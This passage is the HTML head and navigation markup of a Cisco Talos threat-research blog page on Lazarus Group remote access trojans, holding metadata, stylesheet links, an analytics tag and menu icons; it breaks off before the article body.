<!doctype html>
<html lang="en">

<head>
    <title>Lazarus and the tale of three RATs</title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/bootstrap.min.css?v=9ad87340f9">

    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/navigation.css?v=9ad87340f9">
    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/footer.css?v=9ad87340f9">

    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/pagination.css?v=9ad87340f9">

    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/banners.css?v=9ad87340f9">

    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/style.css?v=9ad87340f9">

    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/prism.css?v=9ad87340f9">
    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/prism-vsc-dark-plus.css?v=9ad87340f9">
    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/prism-talos.css?v=9ad87340f9">

    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/landing-page.css?v=9ad87340f9">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;1,100;1,300;1,400&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Mono:wght@400;500&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;1,100;1,300;1,400&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/ghost-theme-utils@latest/dist/css/style.min.css" rel="stylesheet">


    <meta name="description" content="Cisco Talos assesses with high confidence these attacks have been conducted by the North Korean state-sponsored threat actor Lazarus Group.">
    <link rel="icon" href="https://blog.talosintelligence.com/content/images/size/w256h256/2022/07/talos_o_square.png" type="image/png">
    <link rel="canonical" href="https://blog.talosintelligence.com/lazarus-three-rats/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="Cisco Talos Blog">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Lazarus and the tale of three RATs">
    <meta property="og:description" content="Cisco Talos assesses with high confidence these attacks have been conducted by the North Korean state-sponsored threat actor Lazarus Group.">
    <meta property="og:url" content="https://blog.talosintelligence.com/lazarus-three-rats/">
    <meta property="og:image" content="https://blog.talosintelligence.com/content/images/size/w1200/2022/10/image6.jpg">
    <meta property="article:published_time" content="2022-09-08T12:01:00.000Z">
    <meta property="article:modified_time" content="2024-12-12T19:18:20.000Z">
    <meta property="article:tag" content="Threat Spotlight">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Lazarus and the tale of three RATs">
    <meta name="twitter:description" content="Cisco Talos assesses with high confidence these attacks have been conducted by the North Korean state-sponsored threat actor Lazarus Group.">
    <meta name="twitter:url" content="https://blog.talosintelligence.com/lazarus-three-rats/">
    <meta name="twitter:image" content="https://blog.talosintelligence.com/content/images/size/w1200/2022/10/image6.jpg">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Asheer Malhotra">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Threat Spotlight">
    <meta name="twitter:site" content="@TalosSecurity">
    <meta name="twitter:creator" content="@asheermalhotra">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="600">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Cisco Talos Blog",
        "url": "https://blog.talosintelligence.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.talosintelligence.com/content/images/2022/11/TalosBrand_ukraine.svg"
        }
    },
    "author": {
        "@type": "Person",
        "name": "Asheer Malhotra",
        "url": "https://blog.talosintelligence.com/author/asheer-malhotra/",
        "sameAs": [
            "https://twitter.com/asheermalhotra"
        ]
    },
    "headline": "Lazarus and the tale of three RATs",
    "url": "https://blog.talosintelligence.com/lazarus-three-rats/",
    "datePublished": "2022-09-08T12:01:00.000Z",
    "dateModified": "2024-12-12T19:18:20.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://blog.talosintelligence.com/content/images/size/w1200/2022/10/image6.jpg",
        "width": 1200,
        "height": 600
    },
    "keywords": "Threat Spotlight",
    "description": "Cisco Talos assesses with high confidence these attacks have been conducted by the North Korean state-sponsored threat actor Lazarus Group. ",
    "mainEntityOfPage": "https://blog.talosintelligence.com/lazarus-three-rats/"
}
    </script>

    <meta name="generator" content="Ghost 5.113">
    <link rel="alternate" type="application/rss+xml" title="Cisco Talos Blog" href="https://blog.talosintelligence.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/sodo-search.min.js" data-key="4ffb0139d74ada998f4b141e4d" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/main.css" data-sodo-search="https://cisco-talos-blog.ghost.io/" data-locale="en" crossorigin="anonymous"></script>
    
    <link href="https://blog.talosintelligence.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=9ad87340f9"></script><style>:root {--ghost-accent-color: #006db6;}</style>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=9ad87340f9">
    <style type='text/css'>
    img[src*="icon_check_white.svg"] { width: 20px; margin-left: 0px; margin-right: auto; }
    
    #ghost-portal-root { display: none; }
</style>
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-F45RVJG3BK"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-F45RVJG3BK');
</script>
</head>

<body class="post-template tag-threat-spotlight">

    <div id="mobile-page-header" class="desktop-hide">
    <h1>Cisco Talos Blog</h1>
</div>

<nav id="nav">
    <input id="nav-trigger" class="nav-trigger" type="checkbox"/>
    <label for="nav-trigger">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="22px" height="16px" viewBox="0 0 22 16">
            <g id="menu-icon">
                <path fill="#FFFFFF" d="M20.5,3h-19C0.672,3,0,2.329,0,1.5S0.672,0,1.5,0h19C21.328,0,22,0.671,22,1.5S21.328,3,20.5,3z"></path>
                <path fill="#FFFFFF" d="M20.5,9.5h-19C0.672,9.5,0,8.828,0,8c0-0.829,0.672-1.5,1.5-1.5h19C21.328,6.5,22,7.171,22,8   C22,8.828,21.328,9.5,20.5,9.5z"></path>
                <path fill="#FFFFFF" d="M20.5,16h-19C0.672,16,0,15.328,0,14.5S0.672,13,1.5,13h19c0.828,0,1.5,0.672,1.5,1.5S21.328,16,20.5,16z"></path>
            </g>
        </svg>
    </label>
    <div id="top-nav-bar">
    </div>

    <div id="navigation">
        <div class="navigation-logos-wrapper">
            <div id="talos-logo-wrapper">
                <a class="navbar-brand" href="https://talosintelligence.com">
                </a>
            </div>
        </div>
        <div class="navigation-links-wrapper">
            <ul class="main-nav-list">
                <li class="nav-item">
                    <div class="primary-link-wrapper">
                        <a class="primary_nav_link" href="https://talosintelligence.com/reputation">
                            <div class="mobile-nav-icon"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" height="20px" width="20px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
                            <style type="text/css">
                                .white{fill:#FFFFFF;}
                            </style>
                            <g>
                                <path class="white" d="M19.5,9.5h-1.1c-0.3-4.2-3.6-7.6-7.8-7.8V0.5C10.5,0.2,10.3,0,10,0l0,0C9.7,0,9.5,0.2,9.5,0.5l0,0v1.1   C5.3,1.9,1.9,5.3,1.6,9.5H0.5C0.2,9.5,0,9.7,0,10s0.2,0.5,0.5,0.5l0,0h1.1c0.3,4.2,3.6,7.6,7.8,7.8v1.1c0,0.3,0.2,0.5,0.5,0.5l0,0   c0.3,0,0.5-0.2,0.5-0.5l0,0v-1.1c4.2-0.3,7.6-3.6,7.8-7.8h1.1c0.3,0,0.5-0.2,0.5-0.5C20,9.7,19.8,9.5,19.5,9.5 M16.6,10.5h0.7   c-0.3,3.6-3.2,6.5-6.8,6.8v-0.8c0-0.3-0.2-0.5-0.5-0.5l0,0c-0.3,0-0.5,0.2-0.5,0.5v0.8C5.8,17,3,14.2,2.7,10.5h0.8   C3.8,10.5,4,10.3,4,10S3.8,9.5,3.5,9.5l0,0H2.7C3,5.8,5.8,3,9.5,2.7v0.8C9.5,3.7,9.7,4,10,4l0,0c0.3,0,0.5-0.2,0.5-0.5V2.7   C14.2,3,17,5.8,17.3,9.5h-0.7c-0.3,0-0.5,0.2-0.5,0.5C16.1,10.3,16.3,10.5,16.6,10.5L16.6,10.5"></path>
                                                            <circle class="white" cx="10" cy="10" r="3.2"></circle>
                            </g>
                            </svg>
                            </div>
                            <span class="top-nav-link-text">
                                Intelligence Center
                            </span>
                        </a>
                    </div>
                    <input class="sub-nav-trigger" id="intelligence-sub-trigger" type="checkbox">
                    <label class="sub-nav-trigger-label" for="intelligence-sub-trigger">
                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
                            <g>
                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
                            </g>
                        </svg>

                    </label>
                    <ul class="sub-nav sub-nav-single-list">
                        <li class="desktop-hide">
                            <a class="mobile_nav_link" href="https://talosintelligence.com/reputation"><h1>Intelligence Center</h1>
                            </a></li>
                        <li class="desktop-hide">
                            <label class="subnav-back-button" for="intelligence-sub-trigger">BACK</label>
                        </li>
                        <li><a class="secondary_nav_link" href="https://talosintelligence.com/reputation_center">Intelligence Search</a></li>
                        <li><a class="secondary_nav_link" href="https://talosintelligence.com/reputation_center/email_rep">Email &amp; Spam Trends</a></li>
                    </ul>
                    <div class="desktop-hide subnav-overlay"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" height="20px" width="20px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
                        <style type="text/css">
                            .white{fill:#FFFFFF;}
                        </style>
                                                <g>
                            <path class="white" d="M19.5,9.5h-1.1c-0.3-4.2-3.6-7.6-7.8-7.8V0.5C10.5,0.2,10.3,0,10,0l0,0C9.7,0,9.5,0.2,9.5,0.5l0,0v1.1   C5.3,1.9,1.9,5.3,1.6,9.5H0.5C0.2,9.5,0,9.7,0,10s0.2,0.5,0.5,0.5l0,0h1.1c0.3,4.2,3.6,7.6,7.8,7.8v1.1c0,0.3,0.2,0.5,0.5,0.5l0,0   c0.3,0,0.5-0.2,0.5-0.5l0,0v-1.1c4.2-0.3,7.6-3.6,7.8-7.8h1.1c0.3,0,0.5-0.2,0.5-0.5C20,9.7,19.8,9.5,19.5,9.5 M16.6,10.5h0.7   c-0.3,3.6-3.2,6.5-6.8,6.8v-0.8c0-0.3-0.2-0.5-0.5-0.5l0,0c-0.3,0-0.5,0.2-0.5,0.5v0.8C5.8,17,3,14.2,2.7,10.5h0.8   C3.8,10.5,4,10.3,4,10S3.8,9.5,3.5,9.5l0,0H2.7C3,5.8,5.8,3,9.5,2.7v0.8C9.5,3.7,9.7,4,10,4l0,0c0.3,0,0.5-0.2,0.5-0.5V2.7   C14.2,3,17,5.8,17.3,9.5h-0.7c-0.3,0-0.5,0.2-0.5,0.5C16.1,10.3,16.3,10.5,16.6,10.5L16.6,10.5"></path>
                                                    <circle class="white" cx="10" cy="10" r="3.2"></circle>
                        </g>
                        </svg>
                    </div>
                </li>
                <li class="nav-item">
                    <div class="primary-link-wrapper">
                        <a class="primary_nav_link" href="https://talosintelligence.com/vulnerability_info"><div class="mobile-nav-icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="26px" height="20px" viewBox="0 0 26 20">
                            <g id="vuln-icon" class="nav-icon">
                                <path fill="#FFFFFF" d="M24.256,18.49L13.872,0.503C13.692,0.192,13.36,0,13,0c-0.359,0-0.692,0.192-0.872,0.503L1.744,18.49  c-0.18,0.312-0.18,0.695,0,1.006C1.924,19.809,2.257,20,2.616,20h20.769c0.359,0,0.691-0.191,0.871-0.504  C24.436,19.186,24.436,18.803,24.256,18.49 M14.268,18.215h-2.533v-1.85h2.533V18.215z M14.268,15.441h-2.533L10.89,6.515h4.222  L14.268,15.441z"></path>
                            </g>
                        </svg>
                        </div>
                            <span class="top-nav-link-text">
                            Vulnerability Research
                            </span>
                        </a></div>
                    <input class="sub-nav-trigger" id="vuln-sub-trigger" type="checkbox">
                    <label class="sub-nav-trigger-label" for="vuln-sub-trigger">
                        <div class="mobile-nav-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
                            <g>
                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
                            </g>
                        </svg>
                        </div>
                    </label>
                    <ul class="sub-nav sub-nav-single-list">
                        <li class="desktop-hide">
                            <a href="https://talosintelligence.com/vulnerability_info"><h1>Vulnerability Research</h1>
                            </a></li>
                        <li class="desktop-hide">
                            <label class="subnav-back-button" for="vuln-sub-trigger">BACK</label>
                        </li>
                        <li><a class="vulnerabilty-info-nav-link" href="https://talosintelligence.com/vulnerability_reports">Vulnerability Reports</a></li>
                        <li><a class="vulnerabilty-info-nav-link" href="https://talosintelligence.com/ms_advisories">Microsoft Advisories</a></li>
                    </ul>
                    <div class="desktop-hide subnav-overlay">
                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="26px" height="20px" viewBox="0 0 26 20">
                        <g id="vuln-icon" class="nav-icon">
                            <path fill="#FFFFFF" d="M24.256,18.49L13.872,0.503C13.692,0.192,13.36,0,13,0c-0.359,0-0.692,0.192-0.872,0.503L1.744,18.49  c-0.18,0.312-0.18,0.695,0,1.006C1.924,19.809,2.257,20,2.616,20h20.769c0.359,0,0.691-0.191,0.871-0.504  C24.436,19.186,24.436,18.803,24.256,18.49 M14.268,18.215h-2.533v-1.85h2.533V18.215z M14.268,15.441h-2.533L10.89,6.515h4.222  L14.268,15.441z"></path>
                        </g>
                        </svg>
                    </div>
                </li>


               <li class="nav-item">
                   <div class="primary-link-wrapper">
                        <a class="primary_nav_link" href="https://talosintelligence.com/incident_response">
                           <div class="mobile-nav-icon">
                               <svg xmlns="http://www.w3.org/2000/svg" width="111.588" height="148.311" viewBox="0 0 111.588 148.311">
                                    <path d="M1.181,128.446v15.7a4.167,4.167,0,0,0,4.167,4.167h100.9a4.167,4.167,0,0,0,4.167-4.167v-15.7a4.167,4.167,0,0,0-4.167-4.167H5.348a4.167,4.167,0,0,0-4.167,4.166M55.8,63.109a3.277,3.277,0,1,1,0,6.553c-10.344,0-20.755,8.578-20.755,18.57a3.277,3.277,0,1,1-6.554,0C28.489,73.947,41.93,63.109,55.8,63.109Zm0-12.016c-21.787,0-39.325,17.81-39.325,39.937v26.7H95.122V91.03c0-22.128-17.537-39.937-39.324-39.937m52.365-38.3a3.291,3.291,0,0,0-2.254,1.024L88.432,31.294a3.283,3.283,0,0,0,4.642,4.644l17.478-17.479a3.278,3.278,0,0,0-2.389-5.666m-105.138,0a3.276,3.276,0,0,0-1.98,5.666L18.522,35.938a3.283,3.283,0,0,0,4.643-4.644L5.687,13.817A3.255,3.255,0,0,0,3.025,12.793ZM55.389.026a3.276,3.276,0,0,0-2.867,3.345V19.642a3.277,3.277,0,1,0,6.554,0V3.371A3.283,3.283,0,0,0,55.389.026Z" fill="#fff"></path>
                                </svg>
                            </div>
                            <span class="top-nav-link-text">
                                Incident Response
                            </span>
                       </a>
                   </div>
                   <input class="sub-nav-trigger" id="ir-sub-trigger" type="checkbox">
                   <label class="sub-nav-trigger-label" for="ir-sub-trigger">
                       <div class="mobile-nav-icon">
                           <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
                                <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
                               <g>
                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
                               </g>
                           </svg>
                       </div>
                   </label>
                   <ul class="sub-nav sub-nav-single-list">
                       <li class="desktop-hide">
                           <a href="/incident_response">
                               <h1>Incident Response</h1>
                           </a>
                        </li>
                       <li class="desktop-hide">
                           <label class="subnav-back-button" for="ir-sub-trigger">BACK</label>
                       </li>
                       <li>
                           <a class="secondary_nav_link" href="https://talosintelligence.com/incident_response/services#reactive-services">Reactive Services</a>
                       </li>
                       <li>
                           <a class="secondary_nav_link" href="https://talosintelligence.com/incident_response/services#proactive-services">Proactive Services</a></li>
                       <li>
                           <a href="https://talosintelligence.com/incident_response/contact">Emergency Support</a>
                        </li>
                   </ul>
                   <div class="desktop-hide subnav-overlay"><svg xmlns="http://www.w3.org/2000/svg" width="111.588" height="148.311" viewBox="0 0 111.588 148.311">
                     <path d="M1.181,128.446v15.7a4.167,4.167,0,0,0,4.167,4.167h100.9a4.167,4.167,0,0,0,4.167-4.167v-15.7a4.167,4.167,0,0,0-4.167-4.167H5.348a4.167,4.167,0,0,0-4.167,4.166M55.8,63.109a3.277,3.277,0,1,1,0,6.553c-10.344,0-20.755,8.578-20.755,18.57a3.277,3.277,0,1,1-6.554,0C28.489,73.947,41.93,63.109,55.8,63.109Zm0-12.016c-21.787,0-39.325,17.81-39.325,39.937v26.7H95.122V91.03c0-22.128-17.537-39.937-39.324-39.937m52.365-38.3a3.291,3.291,0,0,0-2.254,1.024L88.432,31.294a3.283,3.283,0,0,0,4.642,4.644l17.478-17.479a3.278,3.278,0,0,0-2.389-5.666m-105.138,0a3.276,3.276,0,0,0-1.98,5.666L18.522,35.938a3.283,3.283,0,0,0,4.643-4.644L5.687,13.817A3.255,3.255,0,0,0,3.025,12.793ZM55.389.026a3.276,3.276,0,0,0-2.867,3.345V19.642a3.277,3.277,0,1,0,6.554,0V3.371A3.283,3.283,0,0,0,55.389.026Z" fill="#fff"></path>
                   </svg>
                </div>
               </li>





                <li class="nav-item">
                    <a class="primary_nav_link" href="https://blog.talosintelligence.com">
                        <div class="mobile-nav-icon">
                        <!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="260px" height="296.5px" viewBox="0 0 260 296.5" enable-background="new 0 0 260 296.5" xml:space="preserve">
                        <path fill="#FFFFFF" d="M243.586,42.404h-14.448c-0.943-4.513-3.143-8.813-6.616-12.33L201.793,9.098  c-4.7-4.757-10.972-7.377-17.66-7.377c-6.578,0-12.777,2.547-17.457,7.173l-33.875,33.511H17.586c-6.6,0-12,5.399-12,12V226.28  c0,6.6,5.4,12,12,12H153.83l84.21,56.278l-27.448-56.278h32.994c6.6,0,12-5.4,12-12V54.404  C255.586,47.804,250.186,42.404,243.586,42.404z M214.662,48.045c-0.01,0.2-0.021,0.399-0.044,0.599  c-0.008,0.069-0.021,0.139-0.031,0.207c-0.046,0.345-0.113,0.688-0.196,1.026c-0.034,0.137-0.063,0.273-0.103,0.408  c-0.039,0.135-0.087,0.267-0.133,0.399c-0.051,0.151-0.102,0.302-0.16,0.45c-0.049,0.126-0.105,0.249-0.16,0.373  c-0.068,0.153-0.139,0.307-0.216,0.457c-0.059,0.116-0.12,0.23-0.184,0.345c-0.088,0.157-0.181,0.312-0.278,0.465  c-0.065,0.104-0.13,0.206-0.2,0.308c-0.115,0.168-0.239,0.33-0.366,0.492c-0.064,0.081-0.124,0.165-0.19,0.244  c-0.199,0.238-0.409,0.472-0.635,0.694L82.458,182.308l-47.932,12.871l13.427-47.74L177.223,19.561  c1.917-1.895,4.414-2.84,6.911-2.84c2.534,0,5.068,0.975,6.99,2.92l20.726,20.974c0.545,0.552,1.002,1.156,1.39,1.79  c0.574,0.938,0.975,1.951,1.206,2.993c0.004,0.021,0.01,0.04,0.014,0.06c0.049,0.226,0.086,0.453,0.119,0.682  c0.008,0.06,0.017,0.118,0.024,0.178c0.026,0.211,0.045,0.424,0.058,0.636c0.004,0.077,0.007,0.153,0.009,0.23  c0.007,0.203,0.011,0.407,0.005,0.61C214.673,47.877,214.666,47.961,214.662,48.045z"></path>
                        </svg>
                    </div>
                        <span class="top-nav-link-text">Blog</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class="primary_nav_link" href="https://support.talosintelligence.com">
                        <div class="mobile-nav-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" width="26px" height="20px" viewBox="0 0 123.17 159.292">
                            <path d="M61.59,0,0,17.069v85.32c0,23.472,61.59,56.9,61.59,56.9s61.58-36.288,61.58-56.9V17.069Zm-.433,149.746C38.314,136.662,8.128,114.3,8.128,102.389V23.239l53.029-14.7Z" fill="#fff"></path>
                        </svg>
                        </div>
                        <span class="top-nav-link-text">Support</span>
                    </a>
                </li>
            </ul>


<!--                <li class="nav-item desktop-hide">-->
<!--                    <button class="search-button" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg> <span>Search Blog</span></button>-->
<!--                </li>-->

            <ul class="secondary-nav-list">
                <div class="more-desktop-link">
                    <div class="more-link-wrapper">
                        <span class="more-nav-link">
                            <div class="desktop-nav-icon more-menu-icon">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="22px" height="16px" viewBox="0 0 22 16">
                                <g id="menu-icon">
                                    <path fill="#FFFFFF" d="M20.5,3h-19C0.672,3,0,2.329,0,1.5S0.672,0,1.5,0h19C21.328,0,22,0.671,22,1.5S21.328,3,20.5,3z"></path>
                                    <path fill="#FFFFFF" d="M20.5,9.5h-19C0.672,9.5,0,8.828,0,8c0-0.829,0.672-1.5,1.5-1.5h19C21.328,6.5,22,7.171,22,8   C22,8.828,21.328,9.5,20.5,9.5z"></path>
                                    <path fill="#FFFFFF" d="M20.5,16h-19C0.672,16,0,15.328,0,14.5S0.672,13,1.5,13h19c0.828,0,1.5,0.672,1.5,1.5S21.328,16,20.5,16z"></path>
                                </g>
                                </svg>
                            </div>
                            <span class="top-nav-link-text top-nav-more-text">
                            More
                            </span>
                        </span>
                    </div>
                </div>
                <li class="nav-item more-text-link">
                    <div class="more-link-wrapper more-link-wrapper-mobile">
                        <span class="more-nav-link">
                            <div class="mobile-nav-icon"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" style="enable-background:new 0 0 20 20;" width="25px" height="25px" xml:space="preserve">
                                <style type="text/css">
                                    .white{fill:#FFFFFF;}
                                </style>
                                <path class="white" d="M19.4,17.1c0,0.1-0.1,0-0.2,0c0,0-1.3-0.9-2-1.4c-0.2-0.1-0.5-0.1-0.6,0.1c-0.3,0.3-0.6,0.8-0.9,1.3  c-0.1,0.2-0.1,0.5,0.1,0.6l2,1.5c0.1,0,0,0.1,0.1,0.2c0,0.1,0,0.1-0.1,0.2c-1.2,0.5-2.6,0.2-3.5-0.7c-0.8-0.9-1-2-0.7-3.1L4.5,6.5  c-1,0.3-2.3,0-3-0.9c-0.8-0.9-1.1-1.7-1-2.7c0-0.1,0-0.1,0.1-0.2c0.1,0,0.2,0.1,0.2,0.1l2,1.5C3,4.4,3.3,4.5,3.4,4.2  c0,0,0.5-0.8,0.9-1.3c0.1-0.2,0.1-0.5-0.1-0.6L2.3,0.9c-0.1,0,0-0.1-0.1-0.3c0-0.1,0-0.1,0.1-0.2C3.5-0.1,5,0.2,5.8,1.1  c0.8,0.9,1,2,0.7,3.1l9.1,9.3c1-0.3,2.3,0,3,0.9c0.7,0.7,0.9,1.5,0.9,2.5C19.5,16.9,19.5,17,19.4,17.1z"></path>
                                </svg>
                            </div>
                            <span class="top-nav-link-text top-nav-more-text">
                            Security Resources
                            </span>
                        </span>
                    </div>
                    <input class="sub-nav-trigger" id="security-resources-sub-trigger" type="checkbox">
                    <label class="sub-nav-trigger-label" for="security-resources-sub-trigger">
                        <div class="mobile-nav-icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
                            <g>
                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
                            </g>
                        </svg>
                        </div>
                    </label>
                    <div class="sub-nav sub-nav-multiple-list sub-nav-multiple-list-left">
                        <div class="sub-nav-multiple-wrapper">
                            <div class="sub-nav-list-top-of-mobile-wrapper">
                                <h1 class="sub-nav-list-header sub-nav-list-top-of-mobile">Security Resources</h1>
                                <ul class="sub-nav-list">
                                    <li class="desktop-hide">
                                        <label class="subnav-back-button" for="security-resources-sub-trigger">BACK</label>
                                    </li>
                                </ul>
                            </div>
                            <div class="sub-nav-list-item-wrapper">
                                <span class="sub-nav-desktop-header uppercase">Security Resources</span>
                                <ul class="sub-nav-list">
                                    <li>
                                        <a href="https://talosintelligence.com/software"><span>Open Source Security Tools</span>
                                        </a></li>
                                    <li>
                                        <a href="https://talosintelligence.com/categories"><span>Intelligence Categories Reference</span>
                                        </a></li>
                                    <li>
                                        <a href="https://talosintelligence.com/secure-endpoint-naming"><span>Secure Endpoint Naming Reference</span>
                                        </a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="desktop-hide subnav-overlay"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" style="enable-background:new 0 0 20 20;" width="25px" height="25px" xml:space="preserve">
                        <style type="text/css">
                            .white{fill:#FFFFFF;}
                        </style>
                                                <path class="white" d="M19.4,17.1c0,0.1-0.1,0-0.2,0c0,0-1.3-0.9-2-1.4c-0.2-0.1-0.5-0.1-0.6,0.1c-0.3,0.3-0.6,0.8-0.9,1.3  c-0.1,0.2-0.1,0.5,0.1,0.6l2,1.5c0.1,0,0,0.1,0.1,0.2c0,0.1,0,0.1-0.1,0.2c-1.2,0.5-2.6,0.2-3.5-0.7c-0.8-0.9-1-2-0.7-3.1L4.5,6.5  c-1,0.3-2.3,0-3-0.9c-0.8-0.9-1.1-1.7-1-2.7c0-0.1,0-0.1,0.1-0.2c0.1,0,0.2,0.1,0.2,0.1l2,1.5C3,4.4,3.3,4.5,3.4,4.2  c0,0,0.5-0.8,0.9-1.3c0.1-0.2,0.1-0.5-0.1-0.6L2.3,0.9c-0.1,0,0-0.1-0.1-0.3c0-0.1,0-0.1,0.1-0.2C3.5-0.1,5,0.2,5.8,1.1  c0.8,0.9,1,2,0.7,3.1l9.1,9.3c1-0.3,2.3,0,3,0.9c0.7,0.7,0.9,1.5,0.9,2.5C19.5,16.9,19.5,17,19.4,17.1z"></path>
                        </svg>
                    </div>
                </li>
                <li class="nav-item">
                    <div class="more-link-wrapper more-link-wrapper-mobile">
                        <span class="more-nav-link">
                            <div class="mobile-nav-icon"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" width="25px" height="25px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
                                <style type="text/css">
                                    .sticoncomment{fill-rule:evenodd;clip-rule:evenodd;fill:#FFFFFF;}
                                </style>
